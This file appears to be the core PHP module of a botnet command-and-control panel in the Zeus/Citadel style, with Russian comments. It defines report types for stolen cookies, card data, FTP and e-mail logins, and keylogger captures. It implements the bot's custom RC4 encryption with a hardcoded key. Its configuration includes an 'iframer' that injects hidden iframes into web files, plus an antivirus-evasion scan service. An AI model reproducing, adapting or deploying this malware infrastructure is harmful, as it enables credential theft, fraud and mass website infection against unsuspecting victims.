<?php error_reporting(E_ALL); set_time_limit(0); mb_internal_encoding('UTF-8'); mb_regex_encoding('UTF-8');

///////////////////////////////////////////////////////////////////////////////////////////////////
// Константы.
///////////////////////////////////////////////////////////////////////////////////////////////////

//Кодовая странци для MySQL.
define('MYSQL_CODEPAGE', 'utf8');
define('MYSQL_COLLATE',  'utf8_unicode_ci');

//Ботнет по умолчанию. Менять не рекомендуется.
define('DEFAULT_BOTNET', '-- default --');

//Некотрые данные о протоколе.
define('HEADER_SIZE',      48); //sizeof(BinStorage::STORAGE)
define('HEADER_MD5',       32); //OFFSETOF(BinStorage::STORAGE, MD5Hash)
define('ITEM_HEADER_SIZE', 16); //sizeof(BinStorage::ITEM)

//Конастанты сгенерированые из defines.php
define('SBCID_BOT_ID', 10001);
define('SBCID_BOTNET', 10002);
define('SBCID_BOT_VERSION', 10003);
define('SBCID_NET_LATENCY', 10005);
define('SBCID_TCPPORT_S1', 10006);
define('SBCID_PATH_SOURCE', 10007);
define('SBCID_PATH_DEST', 10008);
define('SBCID_TIME_SYSTEM', 10009);
define('SBCID_TIME_TICK', 10010);
define('SBCID_TIME_LOCALBIAS', 10011);
define('SBCID_OS_INFO', 10012);
define('SBCID_LANGUAGE_ID', 10013);
define('SBCID_PROCESS_NAME', 10014);
define('SBCID_PROCESS_USER', 10015);
define('SBCID_IPV4_ADDRESSES', 10016);
define('SBCID_IPV6_ADDRESSES', 10017);
define('SBCID_BOTLOG_TYPE', 10018);
define('SBCID_BOTLOG', 10019);
define('SBCID_PROCESS_INFO', 10020);
define('SBCID_LOGIN_KEY', 10021);
define('SBCID_REQUEST_FILE', 10022);
define('SBCID_REFERAL_LINK', 10023);
define('SBCID_SCRIPT_ID', 11000);
define('SBCID_SCRIPT_STATUS', 11001);
define('SBCID_SCRIPT_RESULT', 11002);
define('SBCID_MODULES_TYPE', 12000);
define('SBCID_MODULES_VERSION', 12001);
define('SBCID_MODULES_DATA', 12002);
define('CFGID_LAST_VERSION', 20001);
define('CFGID_LAST_VERSION_URL', 20002);
define('CFGID_URL_SERVER_0', 20003);
define('CFGID_URL_ADV_SERVERS', 20004);
define('CFGID_HTTP_FILTER', 20005);
define('CFGID_HTTP_POSTDATA_FILTER', 20006);
define('CFGID_HTTP_INJECTS_LIST', 20007);
define('CFGID_DNS_LIST', 20008);
define('CFGID_DNS_FILTER', 20009);
define('CFGID_CMD_LIST', 20010);
define('CFGID_HTTP_MAGICURI_LIST', 20011);
define('CFGID_FILESEARCH_KEYWORDS', 20012);
define('CFGID_FILESEARCH_EXCLUDES_NAME', 20013);
define('CFGID_FILESEARCH_EXCLUDES_PATH', 20014);
define('CFGID_KEYLOGGER_PROCESSES', 20015);
define('CFGID_KEYLOGGER_TIME', 20016);
define('CFGID_FILESEARCH_MINYEAR', 20017);
define('CFGID_VIDEO_QUALITY', 20101);
define('CFGID_VIDEO_LENGTH', 20102);
define('BLT_UNKNOWN', 0);
define('BLT_COOKIES', 1);
define('BLT_FILE', 2);
define('BLT_HTTP_REQUEST', 11);
define('BLT_HTTPS_REQUEST', 12);
define('BLT_LUHN10_REQUEST', 13);
define('BLT_LOGIN_FTP', 100);
define('BLT_LOGIN_POP3', 101);
define('BLT_FILE_SEARCH', 102);
define('BLT_KEYLOGGER', 103);
define('BLT_MEGAPACKAGE', 1000);
define('BLT_GRABBED_UI', 200);
define('BLT_GRABBED_HTTP', 201);
define('BLT_GRABBED_WSOCKET', 202);
define('BLT_GRABBED_FTPSOFTWARE', 203);
define('BLT_GRABBED_EMAILSOFTWARE', 204);
define('BLT_GRABBED_OTHER', 299);
define('BLT_COMMANDLINE_RESULT', 300);
define('BLT_ANALYTICS_SOFTWARE', 400);
define('BLT_ANALYTICS_FIREWALL', 401);
define('BLT_ANALYTICS_ANTIVIRUS', 402);
define('BMT_VIDEO', 1);
define('BOT_ID_MAX_CHARS', 100);
define('BOTNET_MAX_CHARS', 20);
define('BOTCRYPT_MAX_SIZE', 409600);
define('MAXLIMIT', 1);
define('BO_CLIENT_VERSION', '1.3.4.5');
define('BO_LOGIN_KEY', '5E0D8B0A1FA3AE9146BCD092E58A316E');
define('BO_CRYPT_SALT', 0x55D304BE);
define('BO_REFERAL', 0);

///////////////////////////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Добавление заголовков HTTP для предотврашения кэширования браузером.
*/
function httpNoCacheHeaders()
{
  header('Expires: Fri, 01 Jan 1990 00:00:00 GMT'); //...
  header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0, pre-check=0, post-check=0'); //HTTP/1.1
  header('Pragma: no-cache'); // HTTP/1.0
}

/*
  Проверяет сущетвует ли в путе указатель на уровень выше '..'.
  
  IN $path - string, путь для проверки.
  
  Return   - bool, true - если сущетвует, false - если не сущетвует.
*/
function pathUpLevelExists($path)
{
  return (strstr('/'.str_replace('\\', '/', $path).'/', '/../') === false ? false : true);
}

/*
  Надстройка над basename, которая обрабатывает оба типа слеша, независимо от платформы.
  
  IN $path - string, строка для обработки.
  
  Return   - string, базовое имя.
*/
function baseNameEx($path)
{
  return basename(str_replace('\\', '/', $path));
}

/*
  Преобразование GMT в текстовое представление.
  
  IN $bias - int, GMT в секундах.
  
  Return   - string, GMT в текстовое представление.
*/
function timeBiasToText($bias)
{
  return ($bias >= 0 ? '+' : '-').abs(intval($bias / 3600)).':'.sprintf('%02u', abs(intval($bias % 60)));
}

/*
  Преобразование TickCount в hh:mm:ss
  
  IN $tc - int, TickCount.
  
  Return - string, hh:mm:ss.
*/
function tickCountToText($tc)
{
  return sprintf('%02u:%02u:%02u', $tc / 3600, $tc / 60 - (sprintf('%u', ($tc / 3600)) * 60), $tc - (sprintf('%u', ($tc / 60)) * 60));
}

/*
  Добавление слешей в стиле JavaScript.
  
  IN $string - string, строка для обработки.
  
  Return     - форматированя строка.
*/
function addJsSlashes($string)
{
  return addcslashes($string, "\\/\'\"");
}

/*
  Надстройка для htmlentities, для форматирования в UTF-8.
  
  IN $string - string, строка для обработки.
  
  Return     - форматированя строка.
*/
function htmlEntitiesEx($string)
{
  /*
    HTML uses the standard UNICODE Consortium character repertoire, and it leaves undefined (among
    others) 65 character codes (0 to 31 inclusive and 127 to 159 inclusive) that are sometimes
    used for typographical quote marks and similar in proprietary character sets.
  */
  return htmlspecialchars(preg_replace('|[\x00-\x09\x0B\x0C\x0E-\x1F\x7F-\x9F]|u', ' ', $string), ENT_QUOTES, 'UTF-8');
}

/*
  Надстройка для number_format, для форматирования в int формате для текущего языка.
  
  IN $number - int, число для обработки.
  
  Return     - string, отформатированое число.
*/
function numberFormatAsInt($number)
{
  return number_format($number, 0, '.', ' ');
}

/*
  Надстройка для number_format, для форматирования в float формате для текущего языка.
  
  IN $number   - float, число для обработки.
  IN $decimals - количетсво цифр в дробной части.
  
  Return     - string, отформатированое число.
*/
function numberFormatAsFloat($number, $decimals)
{
  return number_format($number, $decimals, '.', ' ');
}

/*
  Преобразование числа в версию.
  
  IN $i  - int, число для обработки.
  
  Return - string, версия.
*/
function intToVersion($i)
{
  return sprintf("%u.%u.%u.%u", ($i >> 24) & 0xFF, ($i >> 16) & 0xFF,($i >> 8) & 0xFF, $i & 0xFF);
}

/*
  Конвертация данных о версии OS в строку.
  
  IN $os_data - string, данные OS.
  
  Return      - string, строквое представление версии OS.
*/
function osDataToString($os_data)
{
  $name = 'Unknown';
  if(strlen($os_data) == 6 /*sizeof(OSINFO)*/)
  {
    $data = @unpack('Cversion/Csp/Sbuild/Sarch', $os_data);
    
    //Базовое название.
    switch($data['version'])
    {
      case 2: $name = 'XP'; break;
      case 3: $name = 'Server 2003'; break;
      case 4: $name = 'Vista'; break;
      case 5: $name = 'Server 2008'; break;
      case 6: $name = 'Seven'; break;
      case 7: $name = 'Server 2008 R2'; break;
    }
    
    //Архитектура.
    if($data['arch'] == 9 /*PROCESSOR_ARCHITECTURE_AMD64*/)$name .= ' x64';
   
    //Сервиспак.
    if($data['sp'] > 0)$name .= ', SP '.$data['sp'];
  }
  return $name;
}

/*
  Конвертация строки в строку с закоментроваными спец. символами SQL маски.
  
  IN $str - string, исходная строка.
  
  Return  - string, конченая строка.
*/
function toSqlSafeMask($str)
{
  return str_replace(array('%', '_'), array('\%', '\_'), $str);
}

/*
  Получение списка таблиц отчетов по дням.
  
  IN $db - string, БД, из которой будет получены таблицы.
  
  Return - array, список таблиц, отсортированый по имени.
*/
function listReportTables($db)
{
  $template = 'botnet_reports_';
  $tsize    = 15;//strlen($template);
  $list = array();
  
  if(($r = @mysql_list_tables($db)))while(($m = @mysql_fetch_row($r)))if(strncmp($template, $m[0], $tsize) === 0 && is_numeric(substr($m[0], $tsize)))$list[] = $m[0];
  
  @sort($list);
  return $list;
}

/*
  Проверка корректности значений переменной из массива $_POST.

  IN $name     - string, имя.
  IN $min_size - минимальная длина.
  IN $max_size - максимальная длина.

  Return       - NULL - если не значение не походит под условия,
                 string - значение переменной.
*/
function checkPostData($name, $min_size, $max_size)
{
  $data = isset($_POST[$name]) ? trim($_POST[$name]) : '';
  $s = mb_strlen($data);
  if($s < $min_size || $s > $max_size)return NULL;
  return $data;
}

/*
  Подключение к базе и установка основных параметров.
  
  Return - bool, true - в случуи успеха, false в случаи ошибки.
*/
function connectToDb($persistent = false)
{
	if (!$persistent){
	  if(!@mysql_connect($GLOBALS['config']['mysql_host'], $GLOBALS['config']['mysql_user'], $GLOBALS['config']['mysql_pass']))
		  return FALSE;
	} else {
		if (!@mysql_pconnect($GLOBALS['config']['mysql_host'], $GLOBALS['config']['mysql_user'], $GLOBALS['config']['mysql_pass']))
			return FALSE;
	}
  if (!@mysql_query('SET NAMES \''.MYSQL_CODEPAGE.'\' COLLATE \''.MYSQL_COLLATE.'\''))
	  return FALSE;
  if (!@mysql_select_db($GLOBALS['config']['mysql_db']))
	  return FALSE;
  return true;
}

/*
  Выполнение MySQL запроса, с возможностью автоматического восттановления поврежденной таблицы.
  Функция актуальна только для MyISAM.
  
  IN $table - название таблицы.
  IN $query - запрос.
  
  Return    - заначение согласно mysql_query().
*/
function mysqlQueryEx($table, $query)
{
  $r = @mysql_query($query); 
  if($r === false)
  {
    $err = @mysql_errno();
    if(($err === 145 || $err === 1194) && @mysql_query("REPAIR TABLE `{$table}`") !== false)$r = @mysql_query($query); 
  }
  return $r;
}

/*
  Инициализация RC4 ключа.
  
  IN $key - string, текстовый ключ.
  Return  - array, бинарный ключ.
*/
function rc4Init($key)
{
  $hash      = array();
  $box       = array();
  $keyLength = strlen($key);
  
  for($x = 0; $x < 256; $x++)
  {
    $hash[$x] = ord($key[$x % $keyLength]);
    $box[$x]  = $x;
  }

  for($y = $x = 0; $x < 256; $x++)
  {
    $y       = ($y + $box[$x] + $hash[$x]) % 256;
    $tmp     = $box[$x];
    $box[$x] = $box[$y];
    $box[$y] = $tmp;
  }
  
  $magicKey = pack("V", BO_CRYPT_SALT);
  $magicKeyLen = strlen($magicKey);
  
  for($y = $x = 0; $x < 256; $x++)
  {
    $magicKeyPart1 = ord($magicKey[$y])  & 0x07;
    $magicKeyPart2 = ord($magicKey[$y]) >> 0x03;
    if (++$y == $magicKeyLen) $y = 0;

    switch ($magicKeyPart1){
      case 0: $box[$x]  = ~$box[$x]; break;
      case 1: $box[$x] ^= $magicKeyPart2; break;
      case 2: $box[$x] += $magicKeyPart2; break;
      case 3: $box[$x] -= $magicKeyPart2; break;
      case 4: $box[$x]  = $box[$x] >> ($magicKeyPart2%8) | ($box[$x] << (8-($magicKeyPart2%8))); break;
      case 5: $box[$x]  = $box[$x] << ($magicKeyPart2%8) | ($box[$x] >> (8-($magicKeyPart2%8))); break;
      case 6: $box[$x] += 1; break;
      case 7: $box[$x] -= 1; break;
    }
    $box[$x] = $box[$x] & 0xFF;
  }

  return $box;
}

/*
  Широфвание RC4.
  
  IN OUT $data - string, данные для шифрования.
  IN $key      - string, ключ шифрования от rc4Init().
*/
function rc4(&$data, $key)
{
  $len = strlen($data);
  $loginKey = BO_LOGIN_KEY;
  $loginKeyLen = strlen(BO_LOGIN_KEY);
  for($z = $y = $x = $w = 0; $x < $len; $x++)
  {
    $z = ($z + 1) % 256;
    $y = ($y + $key[$z]) % 256;
    $tmp      = $key[$z];
    $key[$z]  = $key[$y];
    $key[$y]  = $tmp;
    $data[$x] = chr(ord($data[$x]) ^ ($key[(($key[$z] + $key[$y]) % 256)]));
    $data[$x] = chr(ord($data[$x]) ^ ord($loginKey[$w]));
    if (++$w == $loginKeyLen) $w = 0;
  }
}

/*
  Визуальное шифрование.
  
  IN OUT $data - string, данные для шифрования.
*/
function visualEncrypt(&$data)
{
  $len = strlen($data);
  for($i = 1; $i < $len; $i++)$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
}

/*
  Визуальное дешифрование.
  
  IN OUT $data - string, данные для шифрования.
*/
function visualDecrypt(&$data)
{
  $len = strlen($data);
  if($len > 0)for($i = $len - 1; $i > 0; $i--)$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
}

/*
  Создание директории, включая весь путь.
  
  IN $dir - string, директория.
*/
function createDir($dir)
{
  $ll = explode('/', str_replace('\\', '/', $dir));
  $cur = '';
  
  foreach($ll as $d)if($d != '..' && $d != '.' && strlen($d) > 0)
  {
    $cur .= $d.'/';
    if(!is_dir($cur) && !@mkdir($cur, 0777))return false;
  }
  return true;
}

function config_gefault_values(){
	return array(
		'mysql_host' => '127.0.0.1',
		'mysql_user' => '',
		'mysql_pass' => '',
		'mysql_db' => '',

		'reports_path' => '_reports',
		'reports_to_db' => 0,
		'reports_to_fs' => 0,
		'reports_geoip' => 0,

		'jabber' => array('login' => '', 'pass' => '', 'host' => '', 'port' => 5222),

		'reports_jn' => 0,
		'reports_jn_logfile' => '',
		'reports_jn_to' => '',
		'reports_jn_list' => '',
		'reports_jn_botmasks' => '',
		'reports_jn_script' => '',

		'scan4you_jid' => '',
		'scan4you_id' => '',
		'scan4you_token' => '',

		'accparse_jid' => '',
		'vnc_server' => '',
		'vnc_notify_jid' => '',

		'reports_deduplication' => 1,

		'iframer' => array(
			'url' => '',
			'html' => '<iframe src="http://example.com/" width=1 height=1 style="visibility: hidden"></iframe>',
			'mode' => 'off', # off | checkonly | inject | preview
			'inject' => 'smart', # smart | append | overwrite
			'traverse' => array(
				'depth' => 3,
				'dir_masks' => array('*www*', 'public*', 'domain*', '*host*', 'ht*docs', '*site*', '*web*'),
				'file_masks' => array('index.*', '*.js', '*.htm*'),
				),
			'opt' => array(
				'reiframe_days' => 0,
				'process_delay' => 0,
				),
			),

		'named_preset' => array(),

		'allowed_countries_enabled' => 0,
		'allowed_countries' => '',

		'botnet_timeout' => 0,
		'botnet_cryptkey' => '',
		);
	}

/*
  Обналвения файла конфигурации.
  
  IN $updateList - array, список для обналвения.
  
  Return - true - в случаи успеха,
           false - в случаи ошибки.
*/
function updateConfig($updateList){
	//Пытаемся дать себе права.
	$file    = defined('FILE_CONFIG') ? FILE_CONFIG : 'system/config.php';
	$oldfile = $file.'.old.php';

	@chmod(@dirname($file), 0777);
	@chmod($file,           0777);
	@chmod($oldfile,        0777);

	//Удаляем старый файл.
	@unlink($oldfile);

	//переименовывем текущий конфиг.
	if(is_file($file) && !@rename($file, $oldfile))
		return false;

	# Defaults
	$defaults = config_gefault_values();

	# Collect values
	$write_config = array();
	foreach (array_keys($defaults) as $key)
		if (isset($updateList[$key]))
			$write_config[$key] = $updateList[$key];
		elseif (isset($GLOBALS['config'][$key]))
			$write_config[$key] = $GLOBALS['config'][$key];
		else
			$write_config[$key] = $defaults[$key];

	# Format
	# Update the binary cryptkey
	$cryptkey_bin = md5(BO_LOGIN_KEY, true);
	rc4($cryptkey_bin, rc4Init($write_config['botnet_cryptkey']));
	$cryptkey_bin = rc4Init($cryptkey_bin);

	$cfgData = "<?php\n\$config = ".var_export($write_config, 1).";\n";
	$cfgData .= "\$config['botnet_cryptkey_bin'] = array(".implode(', ', $cryptkey_bin).");\n";
	$cfgData .= "return \$config;\n";

	# Store
	if(@file_put_contents($file, $cfgData) !== strlen($cfgData))
		return false;

	return true;
	}
